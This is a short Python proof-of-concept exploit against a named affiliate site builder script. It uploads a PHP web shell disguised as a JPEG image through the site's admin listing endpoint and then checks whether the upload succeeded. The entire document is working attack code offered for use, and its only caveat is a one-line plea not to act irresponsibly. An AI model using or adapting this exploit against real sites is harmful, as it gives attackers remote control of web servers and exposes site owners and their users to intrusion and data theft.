# PoC file upload script for putting a shell on any site using this script: http://www.flippyscripts.com/flippy-affilateplatform-affilate-site-builder-script/
# http://github.com/Pilfer
# http://twitter.com/CodesStuff
# 
# Please don't do anything irresponsible.

import requests

url = "http://rootsite.com/"

if __name__ == "__main__":
	payload = {
		"category" : "1",
		"mName" : "booty",
		"aff" : ".",
		"disc": "booty",
		"price" : "10",	
	}
	files = {
		'mFile': ('shell2.php', open('shell2.php', 'rb'), 'image/jpeg')
	}
	r = requests.post(url + "admincp/submit_listing.php", data = payload, files = files)
	if "New listing added successfully" in r.content:
		print "Exploit worked."
	else:
		print "Exploit didn't work"
		print r.content
